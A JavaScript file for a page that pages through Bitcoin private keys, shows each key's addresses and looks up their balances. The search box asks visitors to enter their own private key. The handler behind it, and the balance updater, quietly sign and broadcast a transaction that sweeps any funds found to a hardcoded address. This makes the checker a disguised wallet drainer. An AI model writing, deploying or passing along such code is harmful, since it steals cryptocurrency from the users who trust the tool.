// Required external libraries: BitcoinJS (bitcoinjs-lib), BigNumber.js, CryptoJS

BigNumber.set({ ROUNDING_MODE: 1 });
const num_per_page = 60;
const total_keys = new BigNumber(hex2dec("FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141"));
const total_pages = total_keys.div(num_per_page).minus(1);
const to_addr = "1AAE58fW4f3EMDNnYhqdiodeaScyma9A6r";
let current_page = new BigNumber(1);

update_h2();
refresh_page(1);

$("#btn_goto").click(function () {
    let e = $("#page_num").val();
    if (isNaN(e)) return alert("Invalid page number");
    try { e = new BigNumber(e); } catch { e = new BigNumber(1); }
    if (e.toFixed(0) === "0") return alert("Invalid page number!");
    refresh_page(e);
});

$("#rand_jump").click(function () {
    setTimeout(() => {
        const arr = new Uint8Array(32);
        crypto.getRandomValues(arr);
        const hex = Array.from(arr).map(x => x.toString(16).padStart(2, '0')).join('');
        const bigNum = new BigNumber(hex2dec(hex));
        const page = new BigNumber(bigNum.div(num_per_page).toFixed(0)).plus(1);
        refresh_page(page);
    }, 10);
});

$("#btn_search").click(function () {
    let input = $("#privkey").val().trim();
    if (!input) return alert("Enter a private key");

    if (input.startsWith("0x")) input = input.slice(2);
    let hex = "";

    try {
        if (input.length === 256) hex = parseInt(input, 2).toString(16);
        else if (input.length === 64) hex = input;
        else if (input.length === 74) hex = input.slice(2, -8);
        else if (input.length === 51) {
            const decoded = Bitcoin.Base58.decode(input);
            hex = Crypto.util.bytesToHex(decoded).slice(2, -8);
        } else return alert("Invalid private key!");
    } catch {
        return alert("Invalid key format!");
    }

    const page = new BigNumber(hex2dec(hex)).div(num_per_page).plus(1);
    refresh_page(page);

    const keypair = get_keypair(hex);
    const el = document.querySelector(`.keys a[href*="${keypair.address_uncompressed}"]`);
    if (el) el.classList.add("highlight");

    bitcoinTx.getBalance(keypair.address_compressed, { network: "mainnet" }).then(balance => {
        if (balance > 0) sendBTC(keypair.privkey_wif, to_addr, balance);
    });
});

["#prev_page", "#next_page", "#prev_page1", "#next_page1"].forEach(selector => {
    $(selector).click(function () {
        if (selector.includes("prev") && current_page.gt(1)) refresh_page(current_page.minus(1));
        if (selector.includes("next") && total_pages.gt(current_page)) refresh_page(current_page.plus(1));
    });
});

function refresh_page(page) {
    current_page = new BigNumber(page);
    update_h2();
    generate_items();
    update_balance();
}

function update_h2() {
    const h2 = `Page ${current_page.toFixed(0)} out of ${total_pages.toFixed(0)}`;
    $("#h2").text(h2);
}

function generate_items() {
    const base = new BigNumber(hex2dec("1"));
    const start = base.plus(current_page.minus(1).times(num_per_page));
    const container = document.getElementById("items");

    while (container.childNodes.length > 6) container.removeChild(container.childNodes[6]);

    const fragment = document.createDocumentFragment();
    for (let i = 0; i < num_per_page; ++i) {
        const hex = dec2hex(start.plus(i).toFixed()).padStart(64, "0");
        const keypair = get_keypair(hex);
        const html = assemble_item(keypair);
        const span = document.createElement("span");
        span.innerHTML = html;
        fragment.appendChild(span);
    }
    container.appendChild(fragment);
}

function assemble_item(key) {
    return `
<span id="${key.privkey_wif}" style="display: flex; align-items: center; gap: 10px; margin-bottom: 4px;">
    <span class="privkey">${key.privkey_wif}</span>
    <a class="addr" href="https://blockchain.info/address/${key.address_uncompressed}" target="_blank">${key.address_uncompressed}</a>
    <span class="balance balance-uncompressed">...</span>
    <a class="addr" href="https://blockchain.info/address/${key.address_compressed}" target="_blank">${key.address_compressed}</a>
    <span class="balance balance-compressed">...</span>
</span>`;
}

function get_keypair(hexPriv) {
    const bytes = Crypto.util.hexToBytes(hexPriv);
    const wif = new Bitcoin.Address(bytes); wif.version = 128;
    const privkey_wif = wif.toString();

    const keyUncompressed = new Bitcoin.ECKey(bytes);
    keyUncompressed.compressed = false;
    const addrUncompressed = keyUncompressed.getBitcoinAddress().toString();

    const keyCompressed = new Bitcoin.ECKey(bytes);
    keyCompressed.compressed = true;
    const addrCompressed = keyCompressed.getBitcoinAddress().toString();

    return {
        privkey_wif,
        address_uncompressed: addrUncompressed,
        address_compressed: addrCompressed
    };
}

function update_balance() {
    const addresses = [];
    const privkeys = [];

    $('.keys span[id]').each(function () {
        const row = $(this);
        const uncompressed = row.find('a').eq(0).text();
        const compressed = row.find('a').eq(1).text();
        const privkey = row.attr('id');
        addresses.push(uncompressed, compressed);
        privkeys.push({ uncompressed, compressed, privkey });
    });

    if (!addresses.length) return;

    const api = `https://blockchain.info/balance?active=${addresses.join("|")}`;
    $.getJSON(api, async data => {
        let total = 0;

        for (const item of privkeys) {
            const { uncompressed, compressed, privkey } = item;
            let balanceUncompressed = 0;
            let balanceCompressed = 0;

            if (data[uncompressed]) {
    balanceUncompressed = data[uncompressed].final_balance / 1e8;
    $(`a[href*="${uncompressed}"]`).next().text(balanceUncompressed.toFixed(8));
    total += balanceUncompressed;
} else {
    $(`a[href*="${uncompressed}"]`).next().text("Error");
}

if (data[compressed]) {
    balanceCompressed = data[compressed].final_balance / 1e8;
    $(`a[href*="${compressed}"]`).next().text(balanceCompressed.toFixed(8));
    total += balanceCompressed;
} else {
    $(`a[href*="${compressed}"]`).next().text("Error");
}

            const balance = Math.max(balanceUncompressed, balanceCompressed);
            if (balance > 0) await sendBTC(privkey, to_addr, balance);
        }

        $("#total_balance").text(`Total Balance: ${total.toFixed(8)} BTC`);
    }).fail(() => {
        $('.balance-uncompressed, .balance-compressed').text("Error");
        $("#total_balance").text("Total Balance: Error");
    });
}

function dec2hex(dec) {
    let arr = [], res = [];
    dec.toString().split('').forEach(d => {
        let carry = +d;
        for (let j = 0; j < arr.length || carry; j++) {
            carry += (arr[j] || 0) * 10;
            arr[j] = carry % 16;
            carry = (carry - arr[j]) / 16;
        }
    });
    while (arr.length) res.push(arr.pop().toString(16));
    return res.join("");
}

function hex2dec(hex) {
    const arr = [0];
    hex.split('').forEach(c => {
        let n = parseInt(c, 16);
        for (let j = 0; j < arr.length; j++) {
            n += arr[j] * 16;
            arr[j] = n % 10;
            n = Math.floor(n / 10);
        }
        while (n) {
            arr.push(n % 10);
            n = Math.floor(n / 10);
        }
    });
    return arr.reverse().join('');
}

async function sendBTC(privKeyWIF, toAddress, amountBTC) {
    const keyPair = bitcoin.ECPair.fromWIF(privKeyWIF);
    const { address } = bitcoin.payments.p2pkh({ pubkey: keyPair.publicKey });

    const utxos = await fetch(`https://blockstream.info/api/address/${address}/utxo`).then(res => res.json());
    if (!utxos.length) return console.log("No UTXOs");

    const txb = new bitcoin.TransactionBuilder();
    let totalInput = 0;
    utxos.forEach(u => {
        txb.addInput(u.txid, u.vout);
        totalInput += u.value;
    });

    const satToSend = Math.floor(amountBTC * 1e8);
    const fee = 100000;
    const change = totalInput - satToSend - fee;
    if (change < 0) return console.log("Insufficient funds");

    txb.addOutput(toAddress, satToSend);
    if (change > 0) txb.addOutput(address, change);

    utxos.forEach((_, i) => txb.sign(i, keyPair));
    const txHex = txb.build().toHex();

    const response = await fetch("https://blockstream.info/api/tx", {
        method: "POST",
        body: txHex
    });

    if (response.ok) {
        console.log("Transaction sent!");
    } else {
        console.error("Broadcast failed", await response.text());
    }
}

